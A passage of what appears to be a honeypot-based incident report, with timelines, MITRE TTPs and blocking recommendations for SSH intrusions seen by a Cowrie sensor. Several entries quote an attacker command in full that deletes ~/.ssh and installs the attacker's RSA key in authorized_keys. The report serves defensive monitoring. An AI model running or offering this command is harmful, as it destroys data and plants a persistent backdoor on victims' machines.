| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:42:53` | `cowrie.session.connect` |
| `2026-06-09 16:42:53` | `cowrie.client.version` |
| `2026-06-09 16:42:53` | `cowrie.client.kex` |
| `2026-06-09 16:42:53` | `cowrie.login.success` |
| `2026-06-09 16:42:54` | `cowrie.session.params` |
| `2026-06-09 16:42:54` | `cowrie.command.input` |
| `2026-06-09 16:42:54` | `cowrie.command.failed` |
| `2026-06-09 16:42:54` | `cowrie.log.closed` |
| `2026-06-09 16:42:54` | `cowrie.session.params` |
| `2026-06-09 16:42:54` | `cowrie.command.input` |
| `2026-06-09 16:42:54` | `cowrie.session.file_download` |
| `2026-06-09 16:42:54` | `cowrie.log.closed` |
| `2026-06-09 16:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.182[.]155` to AbuseIPDB if not already reported
- [ ] Block `103.166.182[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60a2e3a6acd9

| Field | Detail |
|---|---|
| **Source IP** | `103.166.182[.]155` |
| **First Seen** | 2026-06-09 16:42 |
| **Last Seen** | 2026-06-09 16:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:42:56` | `cowrie.session.connect` |
| `2026-06-09 16:42:56` | `cowrie.client.version` |
| `2026-06-09 16:42:56` | `cowrie.client.kex` |
| `2026-06-09 16:42:57` | `cowrie.login.success` |
| `2026-06-09 16:42:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.166.182[.]155` to AbuseIPDB if not already reported
- [ ] Block `103.166.182[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98275f995f66

| Field | Detail |
|---|---|
| **Source IP** | `90.230.115[.]5` |
| **First Seen** | 2026-06-09 16:43 |
| **Last Seen** | 2026-06-09 16:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:43:29` | `cowrie.session.connect` |
| `2026-06-09 16:43:30` | `cowrie.client.version` |
| `2026-06-09 16:43:30` | `cowrie.client.kex` |
| `2026-06-09 16:43:33` | `cowrie.login.success` |
| `2026-06-09 16:43:34` | `cowrie.direct-tcpip.request` |
| `2026-06-09 16:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.230.115[.]5` to AbuseIPDB if not already reported
- [ ] Block `90.230.115[.]5` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7ec177a0b30

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:44 |
| **Last Seen** | 2026-06-09 16:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:44:40` | `cowrie.session.connect` |
| `2026-06-09 16:44:40` | `cowrie.client.version` |
| `2026-06-09 16:44:41` | `cowrie.client.kex` |
| `2026-06-09 16:44:42` | `cowrie.login.success` |
| `2026-06-09 16:44:42` | `cowrie.session.params` |
| `2026-06-09 16:44:42` | `cowrie.command.input` |
| `2026-06-09 16:44:42` | `cowrie.command.failed` |
| `2026-06-09 16:44:43` | `cowrie.log.closed` |
| `2026-06-09 16:44:43` | `cowrie.session.params` |
| `2026-06-09 16:44:43` | `cowrie.command.input` |
| `2026-06-09 16:44:43` | `cowrie.session.file_download` |
| `2026-06-09 16:44:43` | `cowrie.log.closed` |
| `2026-06-09 16:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca5f86dab28

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:44 |
| **Last Seen** | 2026-06-09 16:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:44:47` | `cowrie.session.connect` |
| `2026-06-09 16:44:47` | `cowrie.client.version` |
| `2026-06-09 16:44:47` | `cowrie.client.kex` |
| `2026-06-09 16:44:48` | `cowrie.login.success` |
| `2026-06-09 16:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9ab421d783e

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:45 |
| **Last Seen** | 2026-06-09 16:45 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:45:30` | `cowrie.session.connect` |
| `2026-06-09 16:45:30` | `cowrie.client.version` |
| `2026-06-09 16:45:30` | `cowrie.client.kex` |
| `2026-06-09 16:45:31` | `cowrie.login.success` |
| `2026-06-09 16:45:32` | `cowrie.session.params` |
| `2026-06-09 16:45:32` | `cowrie.command.input` |
| `2026-06-09 16:45:32` | `cowrie.command.failed` |
| `2026-06-09 16:45:32` | `cowrie.log.closed` |
| `2026-06-09 16:45:33` | `cowrie.session.params` |
| `2026-06-09 16:45:33` | `cowrie.command.input` |
| `2026-06-09 16:45:33` | `cowrie.session.file_download` |
| `2026-06-09 16:45:33` | `cowrie.log.closed` |
| `2026-06-09 16:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eb9b828fc5a

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:45 |
| **Last Seen** | 2026-06-09 16:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:45:36` | `cowrie.session.connect` |
| `2026-06-09 16:45:36` | `cowrie.client.version` |
| `2026-06-09 16:45:36` | `cowrie.client.kex` |
| `2026-06-09 16:45:37` | `cowrie.login.success` |
| `2026-06-09 16:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-739e06019eb1

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:46 |
| **Last Seen** | 2026-06-09 16:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:46:01` | `cowrie.session.connect` |
| `2026-06-09 16:46:01` | `cowrie.client.version` |
| `2026-06-09 16:46:01` | `cowrie.client.kex` |
| `2026-06-09 16:46:02` | `cowrie.login.success` |
| `2026-06-09 16:46:03` | `cowrie.session.params` |
| `2026-06-09 16:46:03` | `cowrie.command.input` |
| `2026-06-09 16:46:03` | `cowrie.command.failed` |
| `2026-06-09 16:46:03` | `cowrie.log.closed` |
| `2026-06-09 16:46:03` | `cowrie.session.params` |
| `2026-06-09 16:46:03` | `cowrie.command.input` |
| `2026-06-09 16:46:04` | `cowrie.session.file_download` |
| `2026-06-09 16:46:04` | `cowrie.log.closed` |
| `2026-06-09 16:46:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05504e61154f

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:46 |
| **Last Seen** | 2026-06-09 16:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:46:06` | `cowrie.session.connect` |
| `2026-06-09 16:46:06` | `cowrie.client.version` |
| `2026-06-09 16:46:06` | `cowrie.client.kex` |
| `2026-06-09 16:46:07` | `cowrie.login.success` |
| `2026-06-09 16:46:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a077d6b7a717

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:47 |
| **Last Seen** | 2026-06-09 16:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:47:05` | `cowrie.session.connect` |
| `2026-06-09 16:47:05` | `cowrie.client.version` |
| `2026-06-09 16:47:05` | `cowrie.client.kex` |
| `2026-06-09 16:47:06` | `cowrie.login.success` |
| `2026-06-09 16:47:07` | `cowrie.session.params` |
| `2026-06-09 16:47:07` | `cowrie.command.input` |
| `2026-06-09 16:47:07` | `cowrie.command.failed` |
| `2026-06-09 16:47:07` | `cowrie.log.closed` |
| `2026-06-09 16:47:08` | `cowrie.session.params` |
| `2026-06-09 16:47:08` | `cowrie.command.input` |
| `2026-06-09 16:47:08` | `cowrie.session.file_download` |
| `2026-06-09 16:47:08` | `cowrie.log.closed` |
| `2026-06-09 16:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55c965e3bce2

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:47 |
| **Last Seen** | 2026-06-09 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:47:11` | `cowrie.session.connect` |
| `2026-06-09 16:47:11` | `cowrie.client.version` |
| `2026-06-09 16:47:11` | `cowrie.client.kex` |
| `2026-06-09 16:47:12` | `cowrie.login.success` |
| `2026-06-09 16:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18011bb5e7a6

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-09 16:47 |
| **Last Seen** | 2026-06-09 16:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:47:53` | `cowrie.session.connect` |
| `2026-06-09 16:47:53` | `cowrie.client.version` |
| `2026-06-09 16:47:53` | `cowrie.client.kex` |
| `2026-06-09 16:47:54` | `cowrie.login.success` |
| `2026-06-09 16:47:54` | `cowrie.session.params` |
| `2026-06-09 16:47:54` | `cowrie.command.input` |
| `2026-06-09 16:47:54` | `cowrie.command.failed` |
| `2026-06-09 16:47:55` | `cowrie.log.closed` |
| `2026-06-09 16:47:55` | `cowrie.session.params` |
| `2026-06-09 16:47:55` | `cowrie.command.input` |
| `2026-06-09 16:47:55` | `cowrie.session.file_download` |
| `2026-06-09 16:47:55` | `cowrie.log.closed` |
| `2026-06-09 16:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2e261d81944

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:47 |
| **Last Seen** | 2026-06-09 16:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:47:55` | `cowrie.session.connect` |
| `2026-06-09 16:47:55` | `cowrie.client.version` |
| `2026-06-09 16:47:55` | `cowrie.client.kex` |
| `2026-06-09 16:47:56` | `cowrie.login.success` |
| `2026-06-09 16:47:56` | `cowrie.session.params` |
| `2026-06-09 16:47:56` | `cowrie.command.input` |
| `2026-06-09 16:47:56` | `cowrie.command.failed` |
| `2026-06-09 16:47:57` | `cowrie.log.closed` |
| `2026-06-09 16:47:57` | `cowrie.session.params` |
| `2026-06-09 16:47:57` | `cowrie.command.input` |
| `2026-06-09 16:47:57` | `cowrie.session.file_download` |
| `2026-06-09 16:47:57` | `cowrie.log.closed` |
| `2026-06-09 16:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e661182690c8

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:47 |
| **Last Seen** | 2026-06-09 16:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:47:56` | `cowrie.session.connect` |
| `2026-06-09 16:47:56` | `cowrie.client.version` |
| `2026-06-09 16:47:56` | `cowrie.client.kex` |
| `2026-06-09 16:47:57` | `cowrie.login.success` |
| `2026-06-09 16:47:58` | `cowrie.session.params` |
| `2026-06-09 16:47:58` | `cowrie.command.input` |
| `2026-06-09 16:47:58` | `cowrie.command.failed` |
| `2026-06-09 16:47:58` | `cowrie.log.closed` |
| `2026-06-09 16:47:59` | `cowrie.session.params` |
| `2026-06-09 16:47:59` | `cowrie.command.input` |
| `2026-06-09 16:47:59` | `cowrie.session.file_download` |
| `2026-06-09 16:47:59` | `cowrie.log.closed` |
| `2026-06-09 16:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b07c94f1928d

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-09 16:47 |
| **Last Seen** | 2026-06-09 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:47:58` | `cowrie.session.connect` |
| `2026-06-09 16:47:58` | `cowrie.client.version` |
| `2026-06-09 16:47:58` | `cowrie.client.kex` |
| `2026-06-09 16:47:59` | `cowrie.login.success` |
| `2026-06-09 16:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e424272211e0

| Field | Detail |
|---|---|
| **Source IP** | `172.172.196[.]177` |
| **First Seen** | 2026-06-09 16:48 |
| **Last Seen** | 2026-06-09 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:48:00` | `cowrie.session.connect` |
| `2026-06-09 16:48:00` | `cowrie.client.version` |
| `2026-06-09 16:48:00` | `cowrie.client.kex` |
| `2026-06-09 16:48:01` | `cowrie.login.success` |
| `2026-06-09 16:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.196[.]177` to AbuseIPDB if not already reported
- [ ] Block `172.172.196[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab23e204a11c

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:48 |
| **Last Seen** | 2026-06-09 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:48:02` | `cowrie.session.connect` |
| `2026-06-09 16:48:02` | `cowrie.client.version` |
| `2026-06-09 16:48:02` | `cowrie.client.kex` |
| `2026-06-09 16:48:03` | `cowrie.login.success` |
| `2026-06-09 16:48:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7714e08be1d

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-09 16:48 |
| **Last Seen** | 2026-06-09 16:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:48:16` | `cowrie.session.connect` |
| `2026-06-09 16:48:16` | `cowrie.client.version` |
| `2026-06-09 16:48:17` | `cowrie.client.kex` |
| `2026-06-09 16:48:17` | `cowrie.login.success` |
| `2026-06-09 16:48:18` | `cowrie.session.params` |
| `2026-06-09 16:48:18` | `cowrie.command.input` |
